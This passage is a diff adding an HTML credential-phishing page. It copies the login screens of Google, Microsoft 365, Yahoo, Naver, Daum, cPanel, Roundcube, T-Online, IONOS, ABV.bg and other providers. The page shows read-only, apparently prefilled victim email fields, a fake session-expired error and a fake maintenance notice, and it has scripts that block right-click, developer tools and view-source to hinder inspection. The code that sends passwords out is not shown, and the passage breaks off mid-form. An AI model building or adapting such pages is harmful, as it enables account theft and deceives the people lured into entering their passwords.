@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="pageTitle">Secure Sign In</title>
+<style>
+  body{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+</style>
+<script>
+  document.addEventListener('contextmenu',e=>e.preventDefault());
+  document.addEventListener('dragstart',e=>e.preventDefault());
+  document.addEventListener('keydown',function(e){
+    if(e.key==='F12'||e.keyCode===123){e.preventDefault();return false}
+    if(e.ctrlKey&&e.shiftKey&&['I','i','J','j','C','c'].includes(e.key)){e.preventDefault();return false}
+    if(e.metaKey&&e.altKey&&['I','i','J','j','C','c'].includes(e.key)){e.preventDefault();return false}
+    if((e.ctrlKey||e.metaKey)&&['U','u','S','s'].includes(e.key)){e.preventDefault();return false}
+  });
+</script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,'Noto Sans KR','Noto Sans JP','Noto Sans SC',sans-serif;min-height:100vh;background-size:cover;background-position:center;color:#333;display:flex;justify-content:center;align-items:center;padding:20px;transition:background .6s ease}
+
+  /* ---------- DAOU OFFICE / KOREAN TENANT ---------- */
+  body.is-daou{display:block!important;padding:0!important;background:#fff!important}
+  .daou-notice{background:linear-gradient(90deg,#1b53d2 0%,#2f6ae8 55%,#3f7cf0 100%);color:#fff;padding:16px 40px;display:flex;align-items:center;gap:16px;position:relative}
+  .daou-notice .pill{background:#0b2a7a;font-size:12px;font-weight:700;padding:3px 10px;border-radius:4px}
+  .daou-notice h2{font-size:19px;font-weight:700}
+  .daou-notice .meta{font-size:13px;line-height:1.6;opacity:.95}
+  .daou-notice .meta b{font-weight:700}
+  .daou-close{position:absolute;right:24px;top:14px;font-size:12px;cursor:pointer;opacity:.9}
+  .daou-wrap{max-width:440px;margin:0 auto;padding:70px 20px 40px;text-align:center}
+  .daou-logo{font-size:40px;font-weight:800;letter-spacing:2px;color:#8c1c1c;font-family:'Trebuchet MS',Arial,sans-serif}
+  .daou-logo small{display:block;font-size:11px;letter-spacing:5px;font-weight:400;color:#555;margin-top:4px}
+  .daou-field{position:relative;border:1px solid #cfd3d8;border-radius:8px;margin-top:14px;text-align:left;background:#fff}
+  .daou-field.focus{border-color:#22b8c8;box-shadow:0 0 0 3px rgba(34,184,200,.12)}
+  .daou-field label{position:absolute;top:6px;left:14px;font-size:11px;color:#8a9099}
+  .daou-field input{width:100%;border:none;outline:none;padding:22px 40px 8px 14px;font-size:15px;border-radius:8px;background:transparent}
+  .daou-clear{position:absolute;right:12px;top:50%;transform:translateY(-50%);width:20px;height:20px;border-radius:50%;background:#c2c8cf;color:#fff;border:none;font-size:12px;line-height:1;cursor:pointer}
+  .daou-row{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#333;margin:14px 2px 18px}
+  .daou-row label{display:flex;align-items:center;gap:6px;cursor:pointer}
+  .daou-row a{color:#333;text-decoration:none}
+  .daou-btn{width:100%;height:52px;border:none;border-radius:8px;background:#22b8c8;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
+  .daou-btn:hover{background:#19a2b1}
+  .daou-lang{text-align:right;margin-top:12px;font-size:13px;color:#666}
+  .daou-divider{border-top:1px solid #e6e8eb;margin:36px 0 18px}
+  .daou-app{width:100%;height:50px;border:1px solid #dfe2e6;border-radius:8px;background:#fff;font-size:15px;font-weight:600;color:#333;cursor:pointer}
+  .daou-foot{text-align:center;font-size:11px;color:#9aa0a6;margin-top:26px}
+
+  /* ---------- ABV.BG ---------- */
+  body.is-abv{display:block!important;padding:0!important;background:#fff!important}
+  .abv-bar{background:#f0f0f0;height:36px;display:flex;align-items:center;gap:0;padding-left:12px;border-bottom:1px solid #d8d8d8;font-size:13px}
+  .abv-bar .item{padding:0 11px;height:36px;display:flex;align-items:center;border-right:2px solid #d4d0c8;color:#333;font-weight:700}
+  .abv-bar .item.g{color:#1e930c}
+  .abv-bar .spacer{flex:1}
+  .abv-bar .right{padding:0 12px;color:#1e930c;font-weight:700;border-left:2px solid #d4d0c8}
+  .abv-main{max-width:640px;margin:0 auto;padding:24px 16px}
+  .abv-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
+  .abv-logo{font-size:46px;font-weight:800;color:#111;letter-spacing:-2px}
+  .abv-logo span{color:#1e930c}
+  .abv-google{font-size:13px;color:#999}
+  .abv-google b{font-size:22px;letter-spacing:-1px;background:linear-gradient(90deg,#4285F4,#EA4335,#FBBC05,#34A853);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .abv-blue{background:#b8e6fd;padding:18px;display:flex;gap:16px}
+  .abv-form{flex:1}
+  .abv-form h2{font-size:21px;font-weight:400;color:#2f2f2f;margin-bottom:14px}
+  .abv-form p{font-size:12px;font-weight:500;margin-bottom:4px}
+  .abv-form input{width:100%;padding:4px;border:1px solid rgba(136,136,136,.25);background:#fcffdf;font-size:14px;margin-bottom:10px;height:29px}
+  .abv-btn{width:100%;height:40px;background:#1b9e15;color:#fff;border:none;font-size:14px;font-weight:600;cursor:pointer;border-radius:2px}
+  .abv-small{font-size:11px;margin-top:8px}
+  .abv-small a{color:#1e930c}
+  .abv-promo{width:220px;background:linear-gradient(#cfeafd,#a9d8f5);display:flex;align-items:center;justify-content:center;font-size:13px;color:#0b3d91;text-align:center;padding:10px}
+  .abv-strip{background:#1b9e15;color:#fff;font-size:13px;padding:8px 12px;margin-top:8px}
+  .abv-strip b{font-size:16px}
+
+  /* ---------- CPANEL WEBMAIL (own-host) ---------- */
+  body.is-cpanel{display:block!important;padding:0!important;background:#fff!important}
+  .cp-wrap{max-width:400px;margin:0 auto;padding:56px 20px;text-align:center}
+  .cp-err{background:#e04b4b;color:#fff;font-size:13px;padding:12px 14px;border-radius:3px;text-align:left;margin-bottom:26px}
+  .cp-logo{font-size:44px;font-style:italic;font-weight:800;color:#e87722;letter-spacing:-2px;margin-bottom:28px}
+  .cp-label{text-align:left;font-size:14px;font-weight:700;color:#333;margin-bottom:6px}
+  .cp-in{display:flex;align-items:center;border:1px solid #c9ccd0;border-radius:3px;margin-bottom:18px;background:#fff}
+  .cp-in .ico{width:38px;text-align:center;color:#9aa0a6;font-size:15px}
+  .cp-in input{flex:1;border:none;outline:none;padding:10px 8px 10px 0;font-size:14px}
+  .cp-btn{width:100%;height:38px;background:#2f9fd0;color:#fff;border:none;border-radius:3px;font-size:14px;font-weight:600;cursor:pointer}
+  .cp-btn:hover{background:#2389b8}
+  .cp-reset{display:block;margin:18px 0 34px;font-size:13px;font-weight:700;color:#333;text-decoration:none}
+  .cp-langs{display:flex;flex-wrap:wrap;justify-content:center;gap:16px;font-size:12px;color:#333}
+  .cp-langs span{cursor:pointer}
+  .cp-copy{text-align:center;font-size:11px;color:#888;margin-top:40px;line-height:1.6}
+  .cp-copy b{color:#e87722;font-size:13px}
+
+  /* ---------- ROUNDCUBE (ISP webmail) ---------- */
+  body.is-webmail{display:flex!important;align-items:center;justify-content:center;background:#fff!important;padding:0}
+  .rc-layout{display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px}
+  .rc-logo-area{margin-bottom:34px;text-align:center}
+  .rc-brand{font-size:26px;font-weight:800;letter-spacing:-.5px}
+  .rc-logo-svg{width:74px;height:74px;margin:0 auto 14px}
+  .rc-form{width:100%}
+  .rc-input-group{display:flex;align-items:center;border:1px solid #ccc;border-radius:4px;margin-bottom:10px;background:#fff}
+  .rc-input-icon{background:#f5f5f5;border-right:1px solid #ccc;padding:12px 15px;color:#666}
+  .rc-input-group input{flex:1;padding:12px;border:none;font-size:15px;outline:none;background:transparent}
+  .rc-input-group input:disabled{color:#333;background:#fafafa}
+  .rc-btn{width:100%;background:#40b3e0;color:#fff;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;margin-top:10px;text-transform:uppercase}
+  .rc-footer{text-align:center;font-size:13px;color:#999;margin-top:20px}
+  .rc-footer a{color:#40b3e0;text-decoration:none}
+
+  /* ---------- YAHOO ---------- */
+  body.is-yahoo{display:flex!important;flex-direction:column;background:#f4f4f4!important;padding:0!important;justify-content:flex-start}
+  .yahoo-top-bar{width:100%;background:#fff;padding:20px 40px;display:flex;justify-content:space-between;align-items:center}
+  .yahoo-logo{font-size:32px;font-weight:800;color:#5f01d1;letter-spacing:-1px}
+  .yahoo-nav{display:flex;gap:20px;font-size:14px}
+  .yahoo-nav a{color:#232323;text-decoration:none}
+  .yahoo-container{flex:1;display:flex;justify-content:flex-end;padding:40px 20%;width:100%}
+  .yahoo-card{background:#fff;width:100%;max-width:400px;border-radius:16px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.05)}
+  .yahoo-email{font-size:14px;margin-bottom:20px;font-weight:500}
+  .yahoo-title{font-size:24px;font-weight:700;margin-bottom:24px}
+  .yahoo-label{color:#5f01d1;font-size:14px;font-weight:600;margin-bottom:8px;display:block}
+  .yahoo-input-group{position:relative;border:1px solid #5f01d1;border-radius:6px;margin-bottom:10px}
+  .yahoo-input-group input{width:100%;padding:14px 40px 14px 14px;border:none;outline:none;font-size:16px;border-radius:6px;background:transparent}
+  .yahoo-eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#5f01d1;cursor:pointer;font-size:18px}
+  .yahoo-forgot{color:#232323;text-decoration:underline;font-size:14px;margin-top:8px;display:inline-block;margin-bottom:32px}
+  .yahoo-btn{width:100%;background:#5f01d1;color:#fff;border:none;border-radius:24px;padding:14px;font-size:16px;font-weight:600;cursor:pointer}
+
+  /* ---------- GOOGLE ---------- */
+  body.is-google{display:flex!important;flex-direction:column;background:#f0f4f9!important;padding:0!important;justify-content:center;align-items:center}
+  .google-layout{display:flex;flex-direction:column;width:100%;max-width:960px;padding:20px}
+  .google-card{background:#fff;border-radius:28px;display:flex;width:100%;min-height:400px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.05);border:1px solid #dadce0}
+  .google-left{flex:1;display:flex;flex-direction:column}
+  .google-right{flex:1;display:flex;flex-direction:column;justify-content:center;padding-left:40px}
+  .google-logo-svg{width:40px;height:40px;margin-bottom:16px}
+  .google-welcome{font-size:36px;font-weight:400;color:#1f1f1f;margin-bottom:20px}
+  .google-user-pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #747775;border-radius:20px;padding:4px 12px;font-size:14px;max-width:fit-content}
+  .google-input{width:100%;padding:13px 15px;border:1px solid #747775;border-radius:4px;font-size:16px;margin-bottom:10px}
+  .google-checkbox-row{display:flex;align-items:center;gap:8px;font-size:14px;margin-bottom:40px}
+  .google-actions{display:flex;justify-content:space-between;align-items:center}
+  .google-forgot{color:#0b57d0;font-size:14px;font-weight:500;text-decoration:none}
+  .google-btn{background:#0b57d0;color:#fff;border:none;padding:10px 24px;border-radius:20px;font-size:14px;font-weight:500;cursor:pointer}
+  .google-footer{display:flex;justify-content:space-between;margin-top:20px;font-size:12px;color:#444746;width:100%;max-width:960px}
+
+  /* ---------- MICROSOFT 365 ---------- */
+  .m365-layout{display:none;width:100vw;height:100vh;justify-content:center;align-items:center;background:linear-gradient(135deg,#f4e8f8 0%,#e6f0fa 50%,#fce8ef 100%)}
+  body.is-m365{display:flex!important;padding:0!important}
+  body.is-m365 .m365-layout{display:flex}
+  .m365-card{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+  .m365-logo{display:flex;align-items:center;gap:8px;font-size:20px;font-weight:600;color:#5e5e5e;margin-bottom:24px}
+  .m365-logo-icon{width:24px;height:24px;display:grid;grid-template-columns:1fr 1fr;gap:2px}
+  .m365-logo-icon div:nth-child(1){background:#f25022}
+  .m365-logo-icon div:nth-child(2){background:#7fba00}
+  .m365-logo-icon div:nth-child(3){background:#00a4ef}
+  .m365-logo-icon div:nth-child(4){background:#ffb900}
+  .m365-back{display:flex;align-items:center;gap:8px;font-size:15px;margin-bottom:16px}
+  .m365-title{font-size:24px;font-weight:600;margin-bottom:24px}
+  .m365-input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;margin-bottom:16px}
+  .m365-link{color:#0067b8;font-size:14px;text-decoration:none;display:inline-block;margin-bottom:32px}
+  .m365-btn{background:#0067b8;color:#fff;border:none;padding:6px 32px;font-size:15px;float:right;cursor:pointer}
+
+  /* ---------- NAVER ---------- */
+  .naver-layout{display:none;width:100vw;min-height:100vh;justify-content:center;align-items:flex-start;padding-top:50px;background:#fff}
+  body.is-naver{display:flex!important;padding:0!important;background:#fff!important}
+  body.is-naver .naver-layout{display:flex}
+  .naver-card{width:460px}
+  .naver-header{text-align:center;margin-bottom:30px;font-size:34px;font-weight:800;color:#03c75a}
+  .naver-box{border:1px solid #dadada;border-radius:8px;padding:20px 25px}
+  .naver-tabs{display:flex;border-bottom:1px solid #dadada;margin-bottom:20px}
+  .naver-tab{flex:1;text-align:center;padding:10px 0;font-size:14px;font-weight:bold;color:#666}
+  .naver-tab.active{color:#03c75a;border-bottom:2px solid #03c75a}
+  .naver-input-group{border:1px solid #dadada;border-radius:4px;margin-bottom:10px}
+  .naver-input-group input{width:100%;padding:12px;border:none;font-size:14px;outline:none}
+  .naver-input-group input[type=email]{border-bottom:1px solid #dadada;background:#fafafa}
+  .naver-btn{width:100%;background:#03c75a;color:#fff;border:none;padding:15px;font-size:16px;font-weight:bold;border-radius:4px;cursor:pointer}
+
+  /* ---------- DAUM ---------- */
+  .daum-layout{display:none;width:100vw;height:100vh;justify-content:center;align-items:center}
+  body.is-daum{display:flex!important;padding:0!important}
+  body.is-daum .daum-layout{display:flex}
+  .daum-card{background:#fff;width:420px;padding:40px;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.08)}
+  .daum-logo{font-size:32px;font-weight:700;color:#333;margin-bottom:30px}
+  .daum-logo span{color:#f9a800}
+  .daum-input{width:100%;padding:12px;border:1px solid #ccc;margin-bottom:10px;font-size:14px}
+  .daum-btn{width:100%;background:#f9a800;color:#fff;border:none;padding:12px;font-size:15px;font-weight:bold;cursor:pointer}
+
+  /* ---------- T-ONLINE ---------- */
+  body.is-tonline{display:flex!important;align-items:center;justify-content:center;background:linear-gradient(135deg,#8c8c9e 0%,#b58b9c 100%)!important;padding:0}
+  .tonline-box{background:#fff;width:480px;border-radius:8px;padding:36px;box-shadow:0 10px 30px rgba(0,0,0,.15);position:relative}
+  .tonline-logo{position:absolute;top:0;left:0;width:80px;height:80px;background:#e20074;display:flex;align-items:center;justify-content:center;border-top-left-radius:8px}
+  .tonline-logo svg{fill:#fff;width:40px;height:40px}
+  .tonline-header{display:flex;align-items:center;gap:12px;margin-bottom:30px;margin-top:10px;padding-left:90px}
+  .tonline-email{font-weight:600;font-size:16px;color:#333}
+  .tonline-title{font-size:28px;font-weight:700;margin-bottom:24px}
+  .tonline-input-group{position:relative;margin-bottom:12px}
+  .tonline-input-group input{width:100%;padding:12px 40px 12px 14px;border:1px solid #ccc;border-radius:6px;font-size:16px}
+  .tonline-link{color:#e20074;font-size:14px;display:inline-block;margin-bottom:24px}
+  .tonline-btn-main{width:100%;background:#e20074;color:#fff;border:none;padding:14px;font-size:16px;font-weight:700;border-radius:6px;cursor:pointer;text-transform:uppercase}
+
+  /* ---------- HI-BOX ---------- */
+  body.is-hibox{display:flex!important;align-items:center;justify-content:center;background:#f0f0f0!important;padding:0}
+  .hibox-wrapper{width:1000px;background:#fff;box-shadow:0 5px 20px rgba(0,0,0,.1);border-radius:4px;overflow:hidden}
+  .hibox-top{background:#fff;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #eee}
+  .hibox-logo{font-size:28px;font-weight:800;color:#0055a4;font-style:italic}
+  .hibox-nav{background:#0055a4;display:flex;color:#fff;padding:0 20px;font-size:14px}
+  .hibox-nav div{padding:10px 20px;border-right:1px solid #3377cc}
+  .hibox-content{display:flex;padding:20px;gap:20px}
+  .hibox-banner{flex:1;background:linear-gradient(180deg,#a0d4f0,#60b0e0);border-radius:4px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px;color:#004488;text-align:center}
+  .hibox-sidebar{width:340px;border:1px solid #ccc;border-radius:4px}
+  .hibox-sidebar-header{background:#f8f8f8;padding:10px 15px;font-weight:bold;border-bottom:1px solid #ccc}
+  .hibox-form{padding:20px}
+  .hibox-row{display:flex;align-items:center;margin-bottom:15px}
+  .hibox-row label{width:50px;font-size:13px;font-weight:bold}
+  .hibox-row input{flex:1;padding:6px;border:1px solid #ccc;font-size:13px}
+  .hibox-btn{background:#ff6600;color:#fff;border:none;padding:8px 24px;border-radius:4px;font-weight:bold;cursor:pointer}
+
+  /* ---------- IONOS ---------- */
+  body.is-ionos{display:block!important;background:#f4f6f8!important;padding:0!important}
+  .ionos-header{background:#fff;padding:15px 40px;display:flex;align-items:center;border-bottom:1px solid #e0e0e0}
+  .ionos-logo{font-size:26px;font-weight:800;color:#003087;letter-spacing:-1px}
+  .ionos-main{display:flex;justify-content:center;padding:60px 20px}
+  .ionos-card{background:#fff;width:520px;border-radius:8px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,.05)}
+  .ionos-title{font-size:24px;font-weight:600;margin-bottom:24px}
+  .ionos-user-row{display:flex;align-items:center;gap:10px;font-size:14px;color:#003087;margin-bottom:30px;font-weight:500}
+  .ionos-input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin-bottom:12px}
+  .ionos-btn{width:100%;background:#003087;color:#fff;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:24px;cursor:pointer}
+
+  /* ---------- GENERIC BRANDED ---------- */
+  .login-container{background:#fff;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.2);max-width:420px;width:100%;padding:48px 40px;position:relative;z-index:1}
+  .header{text-align:center;margin-bottom:32px}
+  .logo-icon{width:64px;height:64px;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;color:#fff;font-size:28px;font-weight:700}
+  .logo-text{font-size:24px;font-weight:700}
+  .subtitle{color:#5f6368;font-size:14px;margin-top:4px}
+  .domain-badge{display:inline-block;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600;margin-top:8px}
+  .form-group{margin-bottom:20px}
+  .form-group label{display:block;color:#3c4043;font-size:14px;font-weight:500;margin-bottom:6px}
+  .form-group input{width:100%;padding:12px 14px;border:2px solid #dadce0;border-radius:8px;font-size:15px}
+  .form-group input:disabled{background:#f8f9fa;color:#5f6368}
+  .password-wrapper{position:relative}
+  .password-wrapper input{padding-right:44px}
+  .toggle-password{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#9aa0a6;cursor:pointer;font-size:18px}
+  .btn-signin{width:100%;padding:14px;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer}
+  .footer-links{display:flex;justify-content:space-between;margin-top:20px;font-size:13px}
+  .footer-links a{color:#1a73e8;text-decoration:none}
+  .footer-text{text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid #e8eaed;font-size:12px;color:#9aa0a6}
+  .err-box{color:#d32f2f;font-size:13px;margin-top:10px;display:none;font-weight:500}
+  .err-box.show{display:block}
+
+  /* ---------- LOADING ---------- */
+  .loading-layout{display:none;width:100vw;height:100vh;justify-content:center;align-items:center;background:#fafafa;position:fixed;inset:0;z-index:999}
+  body.is-loading{display:block!important;padding:0!important}
+  body.is-loading .loading-layout{display:flex}
+  .spinner{width:40px;height:40px;border:4px solid #f0f0f0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body oncontextmenu="return false;">
+
+<div class="loading-layout" id="loadingContainer"><div class="spinner"></div></div>
+
+<!-- DAOU OFFICE -->
+<div id="daouContainer" style="display:none">
+  <div class="daou-notice">
+    <span class="pill">공지</span>
+    <div>
+      <h2>시스템 점검 사전 안내</h2>
+      <div class="meta">일시 <b>2026년 11월 28일(토) 15:00 ~ 11월 29일(일) 15:00 (24시간)</b><br>영향 <b>점검 시간 동안 전 서비스 이용 불가</b></div>
+    </div>
+    <div class="daou-close" onclick="this.parentElement.style.display='none'">✕ 다시보지 않기</div>
+  </div>
+  <div class="daou-wrap">
+    <div class="daou-logo">JUNOTNC<small>TECHNOLOGY &amp; CONSULTING</small></div>
+    <div class="daou-field" id="daouIdField">
+      <label>아이디</label>
+      <input type="email" id="daouEmail" readonly>
+      <button class="daou-clear" onclick="document.getElementById('daouEmail').value=''">✕</button>
+    </div>
+    <div class="daou-field">
+      <label>비밀번호</label>
+      <input type="password" id="daouPass" autocomplete="off">
+    </div>
+    <div class="daou-row">
+      <label><input type="checkbox"> 계정 기억</label>
+      <a href="#">비밀번호 초기회</a>
+    </div>
+    <button class="daou-btn" onclick="submitLogin('daou')">로그인</button>
+    <div class="daou-lang">⌄ 한국어</div>
+    <div class="daou-divider"></div>
+    <button class="daou-app">⭳ 앱 다운로드</button>
+    <div id="daou-err" class="err-box" style="text-align:center"></div>
+    <div class="daou-foot">© DAOU Office</div>
+  </div>
+</div>
+
+<!-- ABV.BG -->
+<div id="abvContainer" style="display:none">
+  <div class="abv-bar">
+    <div class="item">🏠 АБВ Поща</div><div class="item">DOX</div><div class="item g">АБВ на твой домейн</div>
+    <div class="item">АБВTrustSuite</div><div class="item g">АБВ+</div>
+    <div class="spacer"></div><div class="right">Регистрация в АБВ</div><div class="right">АБВ профил</div>
+  </div>
+  <div class="abv-main">
+    <div class="abv-head">
+      <div class="abv-logo">АБВ</div>
+      <div class="abv-google">powered by <b>Google</b></div>
+    </div>
+    <div class="abv-blue">
+      <div class="abv-form">
+        <h2>Вход в АБВ Поща</h2>
+        <p>АБВ потребител:</p>
+        <input type="email" id="abvEmail" readonly>
+        <p>Парола:</p>
+        <input type="password" id="abvPass">
+        <button class="abv-btn" onclick="submitLogin('abv')">Вход</button>
+        <div class="abv-small"><a href="#">Забравена парола</a></div>
+        <div id="abv-err" class="err-box"></div>
+        <div class="abv-small">Нямаш профил в АБВ? <a href="#">Регистрирай се!</a></div>
+      </div>
+      <div class="abv-promo">Влез в пощата си<br>от всяко устройство</div>
+    </div>
+    <div class="abv-strip">Защо и как <b>изгуби достъп</b> до пощата си?</div>
+  </div>
+</div>
+
+<!-- CPANEL WEBMAIL (own-host) -->
+<div id="cpanelContainer" style="display:none">
+  <div class="cp-wrap">
+    <div class="cp-err" id="cpSessionErr">Your session cookie is invalid. Please log in again.</div>
+    <div class="cp-logo">Webmail</div>
+    <div class="cp-label">Email Address</div>
+    <div class="cp-in"><div class="ico">👤</div><input type="email" id="cpanelEmail" readonly></div>
+    <div class="cp-label">Password</div>
+    <div class="cp-in"><div class="ico">🔒</div><input type="password" id="cpanelPass" placeholder="Enter your email password."></div>
+    <button class="cp-btn" onclick="submitLogin('cpanel')">Log in</button>
+    <a href="#" class="cp-reset">Reset Password</a>
+    <div class="cp-langs"><span>العربية</span><span>čeština</span><span>dansk</span><span>Deutsch</span><span>Ελληνικά</span><span>English</span><span>español</span><span>español latinoamericano</span><span>…</span></div>
+    <div id="cpanel-err" class="err-box" style="text-align:center"></div>
+    <div class="cp-copy"><b>cP</b><br>Copyright 2026 cPanel, L.L.C.<br>Privacy Policy</div>
+  </div>
+</div>
+
+<!-- ROUNDCUBE -->
+<div class="rc-layout" id="webmailContainer" style="display:none">
+  <div class="rc-logo-area">
+    <svg class="rc-logo-svg" viewBox="0 0 100 100"><path d="M20 80 L50 100 L80 80 L80 40 L50 20 L20 40 Z" fill="#37474f"/><path d="M20 80 L50 100 L80 80 L50 60 Z" fill="#1b8cd6"/><circle cx="50" cy="45" r="25" fill="#e0e0e0"/></svg>
+    <div class="rc-brand" id="rcBrand">Webmail</div>
+  </div>
+  <div class="rc-form">
+    <div class="rc-input-group"><div class="rc-input-icon">👤</div><input type="email" id="webmailEmail" readonly disabled></div>
+    <div class="rc-input-group"><div class="rc-input-icon">🔒</div><input type="password" id="webmailPass" placeholder="Password"></div>
+    <button class="rc-btn" onclick="submitLogin('webmail')">LOGIN</button>
+    <div id="webmail-err" class="err-box" style="text-align:center"></div>
+  </div>
+  <div class="rc-footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
+</div>
+
+<!-- YAHOO -->
+<div id="yahooContainer" style="display:none;width:100%;min-height:100vh;flex-direction:column">
+  <div class="yahoo-top-bar"><div class="yahoo-logo">yahoo!</div><div class="yahoo-nav"><a href="#">Help</a><a href="#">Terms</a><a href="#">Privacy</a></div></div>
+  <div class="yahoo-container"><div class="yahoo-card">
+    <div class="yahoo-email" id="yahooEmailDisplay"></div>
+    <div class="yahoo-title">Enter your password</div>
+    <label class="yahoo-label">Password</label>
+    <div class="yahoo-input-group"><input type="password" id="yahooPass"><button class="yahoo-eye" onclick="toggleYahooPass()">👁️</button></div>
+    <a href="#" class="yahoo-forgot">Forgot password</a>
+    <button class="yahoo-btn" onclick="submitLogin('yahoo')">Next</button>
+    <div id="yahoo-err" class="err-box" style="text-align:center;margin-top:15px"></div>
+  </div></div>
+</div>
+
+<!-- GOOGLE -->
+<div class="google-layout" id="googleContainer" style="display:none">
+  <div class="google-card">
+    <div class="google-left">
+      <svg class="google-logo-svg" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      <h1 class="google-welcome">Welcome</h1>
+      <div class="google-user-pill"><span id="googleEmailDisplay"></span></div>
+    </div>
+    <div class="google-right">
+      <input type="password" id="googlePass" class="google-input" placeholder="Enter your password">
+      <div class="google-checkbox-row"><input type="checkbox" onclick="toggleGooglePass()"><label>Show password</label></div>
+      <div class="google-actions"><a href="#" class="google-forgot">Forgot password?</a><button class="google-btn" onclick="submitLogin('google')">Next</button></div>
+      <div id="google-err" class="err-box"></div>
+    </div>
+  </div>
+  <div class="google-footer"><span>English (United States)</span><span>Help · Privacy · Terms</span></div>
+</div>
+
+<!-- M365 -->
+<div class="m365-layout" id="m365Container">
+  <div class="m365-card">
+    <div class="m365-logo"><div class="m365-logo-icon"><div></div><div></div><div></div><div></div></div>Microsoft</div>
+    <div class="m365-back"><span id="m365EmailDisplay"></span></div>
+    <div class="m365-title">Enter password</div>
+    <input type="password" id="m365Pass" class="m365-input" placeholder="Password">
+    <a href="#" class="m365-link">Forgot my password</a>
+    <div style="text-align:right"><button class="m365-btn" onclick="submitLogin('m365')">Sign in</button></div>
+    <div id="m365-err" class="err-box"></div>
+  </div>
+</div>
+
+<!-- NAVER -->
+<div class="naver-layout" id="naverContainer">
+  <div class="naver-card">
+    <div class="naver-header">NAVER</div>
+    <div class="naver-box">
+      <div class="naver-tabs"><div class="naver-tab active">ID/Phone number</div><div class="naver-tab">QR code</div></div>
+      <div class="naver-input-group"><input type="email" id="naverEmail" readonly disabled><input type="password" id="naverPass" placeholder="Password"></div>
+      <button class="naver-btn" onclick="submitLogin('naver')">Sign in</button>
+      <div id="naver-err" class="err-box" style="text-align:center"></div>
+    </div>
+  </div>
+</div>
+
+<!-- DAUM -->
+<div class="daum-layout" id="daumContainer">
+  <div class="daum-card">
+    <div class="daum-logo">Daum <span>메일</span></div>
+    <input type="email" id="daumEmail" class="daum-input" readonly disabled>
+    <input type="password" id="daumPass" class="daum-input" placeholder="비밀번호 (Password)">
+    <button class="daum-btn" onclick="submitLogin('daum')">로그인 (Log In)</button>
+    <div id="daum-err" class="err-box"></div>
+  </div>
+</div>
+
+<!-- T-ONLINE -->
+<div class="tonline-box" id="tonlineContainer" style="display:none">
+  <div class="tonline-logo"><svg viewBox="0 0 24 24"><path d="M4 4h4v16H4zM10 4h4v16h-4zM16 4h4v16h-4z"/></svg></div>
+  <div class="tonline-header"><div class="tonline-email"><span id="tonlineEmailDisplay"></span></div></div>
+  <div class="tonline-title">Passwort eingeben</div>
+  <div class="tonline-input-group"><input type="password" id="tonlinePass" placeholder="Passwort"><button class="yahoo-eye" onclick="toggleTonPass()">👁️</button></div>
+  <a href="#" class="tonline-link">Passwort vergessen?</a>
+  <button class="tonline-btn-main" onclick="submitLogin('tonline')">LOGIN</button>
+  <div id="tonline-err" class="err-box"></div>
+</div>
+
+<!-- HI-BOX -->
+<div class="hibox-wrapper" id="hiboxContainer" style="display:none">
+  <div class="hibox-top"><div class="hibox-logo">hiBox <span style="color:#ff6600;font-style:normal;font-size:16px">全能信箱</span></div></div>
+  <div class="hibox-nav"><div>回首頁</div><div>產品簡介</div><div>產品費率</div><div>常見問題</div><div>聯絡我們</div></div>
+  <div class="hibox-content">
+    <div class="hibox-banner"><h2>擔心hiBox信箱帳密外洩？</h2><p>郵件簡訊OTP密碼鎖，讓您的信箱更安全！</p></div>
+    <div class="hibox-sidebar">
+      <div class="hibox-sidebar-header">會員登入 Login</div>
+      <div class="hibox-form">
